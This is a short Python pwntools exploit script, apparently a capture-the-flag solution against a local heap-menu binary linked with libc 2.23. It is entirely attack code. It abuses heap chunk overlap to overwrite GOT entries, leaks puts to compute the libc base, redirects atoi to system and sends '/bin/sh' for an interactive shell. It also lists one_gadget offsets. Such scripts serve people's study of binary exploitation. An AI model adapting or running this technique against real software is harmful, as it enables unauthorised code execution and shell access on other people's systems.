from pwn import*
def add(size,content):
	p.sendlineafter('choice:','1')
	p.sendlineafter('How long is this message?',str(size))
	if size >0x400:
		return 0
	p.sendafter('What is the content of the message?',content)
def free(idx):
	p.sendlineafter('choice:','2')
	p.sendlineafter('deleted?',str(idx))
def edit(idx,content):
	p.sendlineafter('choice:','3')
	p.sendlineafter('modified?',str(idx))
	p.sendafter('message?',content)
p = process('./main')
elf = ELF('./main')
context.log_level = 'debug'
libc = ELF('libc-2.23.so',checksec=False)
og = [0x45216,0x4526A,0xF02A4,0xF1147]
add(0x18,'FMYY')
free(0)
add(0x500,'FMYY')
add(0x18,'FMYY')
free(1)
add(0x500,'FMYY')
add(0x18,'FMYY')
edit(1,p64(0) + p64(0x21) + p64(elf.got['free']))
edit(2,p64(0x400670))
edit(1,p64(0) + p64(0x21) + p64(elf.got['puts']))
free(2)
p.recvline()
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['puts']
libc.address = libc_base
edit(0,p64(0) + p64(0x21) + p64(elf.got['atoi']))
edit(1,p64(libc.sym['system']))
p.sendafter('choice:','/bin/sh\x00')
p.interactive()


